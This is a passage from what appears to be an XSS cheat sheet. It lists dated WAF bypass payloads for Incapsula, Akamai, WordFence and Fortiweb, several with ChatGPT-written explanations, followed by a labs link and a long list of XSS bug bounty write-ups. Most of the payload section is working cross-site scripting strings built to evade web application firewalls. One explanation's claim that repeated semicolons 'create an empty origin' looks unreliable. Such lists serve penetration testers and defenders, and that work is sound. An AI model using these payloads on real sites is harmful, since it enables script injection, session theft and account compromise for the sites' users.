anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018

```javascript
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```
**ChatGPT Explanation:**  
This code defines an HTML `<object>` element, which is used to embed external resources, such as an image, a video, or a web page, into a web page. The data attribute of the `<object>` element contains a data URI, which is a URI scheme that allows you to include data in-line in web pages as if they were external resources.

The data URI of the data attribute contains the following elements:

1. `data:text/html` is the media type and subtype of the data, which specifies that the data is in HTML format.
2. `;;;` is a string of semicolons, which is used to create an empty origin.
3. `base64,` is the encoding format of the data, which specifies that the data is encoded in base64.
4. `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` is the encoded data, which is the base64-encoded representation of the following JavaScript code: <script>alert(1)</script>.

When the <object> element is rendered by a browser, the JavaScript code inside the data attribute will be executed, which will pop-up an alert box with the value 1.

----

### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019

```html
<svg onload\r\n=$.globalEval("al"+"ert()");>
```
**ChatGPT Explanation:**  
1. <svg is an opening tag for the HTML `<svg>` element, which is used to create scalable vector graphics.
2. onload\r\n= is an event handler attribute which triggers the code when the svg element is loaded by the browser.
3. `$.globalEval("al"+"ert()")` is a JavaScript code that concatenates the strings "al" and "ert()" to create the string "alert()" and then evaluates it as a JavaScript code by using the $.globalEval() function, this function is used to execute any JavaScript code passed as an argument. 
4. `>` is the closing tag for the malformed HTML element.

When rendered by a browser, this string will create a malformed HTML code, which will look like: <svg onload=$.globalEval("al"+"ert()");>. This malformed code will execute the script when the svg element is loaded by the browser, which will pop-up an alert box.

---

### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018

```javascript
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018

```html
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018

```javascript
<a href=javas&#99;ript:alert(1)>
```

### Fortiweb WAF Bypass by [@rezaduty](https://twitter.com/rezaduty) - 9th July 2019

```javascript
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```
**ChatGPT Explanation:**  
1. `\u003e` is the unicode representation of the greater-than sign >.
2. `\u003c` is the unicode representation of the less-than sign <.
3. `\u0068\u0031` is the unicode representation of the string "h1", which is used to create a heading element `<h1>` in HTML.
4. `onclick=alert('1')` is an event handler which triggers the alert() function with the argument '1' when the heading element is clicked.

When rendered by a browser, this string will create a malformed HTML code, which will look like: `<h1 onclick=alert('1')>`. This malformed code will execute the script when the h1 element is clicked, which will pop-up an alert box with the value 1. 

---
## Labs

* [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)

## References

- [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- tbm
- [(Relative Path Overwrite) RPO XSS - Infinite Security](http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html)
- [RPO TheSpanner](http://www.thespanner.co.uk/2014/03/21/rpo/)
- [RPO Gadget - innerthmtl](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [Relative Path Overwrite - Detectify](https://support.detectify.com/support/solutions/articles/48001048955-relative-path-overwrite)
- [XSS ghettoBypass - d3adend](http://d3adend.org/xss/ghettoBypass)
- [XSS without HTML: Client-Side Template Injection with AngularJS](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)
- [XSSING WEB PART - 2 - Rakesh Mane](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [Making an XSS triggered by CSP bypass on Twitter. @tbmnull](https://www.buaq.net/go-25883.html)
- [Ways to alert(document.domain) - @tomnomnom](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs](https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [Sleeping stored Google XSS Awakens a $5000 Bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by Patrik Fehrenbach
- [RPO that lead to information leakage in Google](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/) by filedescriptor
- [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton
- [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager
- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen
- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
- [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
- [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
- [Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com](https://hackerone.com/reports/150179) by secgeek
- [Command Injection in Google Console](http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html) by Venkat S
- [Facebook's Moves - OAuth XSS](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html) by PAULOS YIBELO
- [Stored XSS on developer.uber.com via admin account compromise in Uber](https://hackerone.com/reports/152067) by James Kettle (albinowax)
- [Yahoo Mail stored XSS](https://klikki.fi/adv/yahoo.html) by Klikki Oy
- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)](http://mksben.l0.cm/2016/07/xxn-caret.html) by Masato Kinugawa
- [Youtube XSS](https://labs.detectify.com/2015/06/06/google-xss-turkey/) by fransrosen
- [Best Google XSS again](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) - by Krzysztof Kotowicz
- [IE & Edge URL parsing Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
- [Google XSS subdomain Clickjacking](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [Microsoft XSS and Twitter XSS](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [Flash XSS mega nz](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/) - by frans
- [xss in google IE, Host Header Reflection](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Years ago Google xss](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [xss in google by IE weird behavior](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [xss in Yahoo Fantasy Sport](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [xss in Yahoo Mail Again, worth $10000](https://klikki.fi/adv/yahoo2.html) by Klikki Oy
- [Sleeping XSS in Google](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by securityguard
- [Decoding a .htpasswd to earn a payload of money](https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/) by securityguard
- [Google Account Takeover](http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form)
- [AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2](http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/) by geekboy
- [Uber Self XSS to Global XSS](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett
- [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)
- [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [postMessage XSS Bypass](https://hackerone.com/reports/231053)
- [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
- [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
- [XSS due to improper regex in third party js Uber 7k XSS](http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/)
- [XSS in TinyMCE 2.4.0](https://hackerone.com/reports/262230) by Jelmer de Hen
- [Pass uncoded URL in IE11 to cause XSS](https://hackerone.com/reports/150179)
- [Twitter XSS by stopping redirection and javascript scheme](http://blog.blackfan.ru/2017/09/devtwittercom-xss.html) by Sergey Bobrov
- [Auth DOM Uber XSS](http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html)
- [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be)
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
- [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
- [Bypass < with ＜](https://hackerone.com/reports/639684)
- [Bypassing Signature-Based XSS Filters: Modifying Script Code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
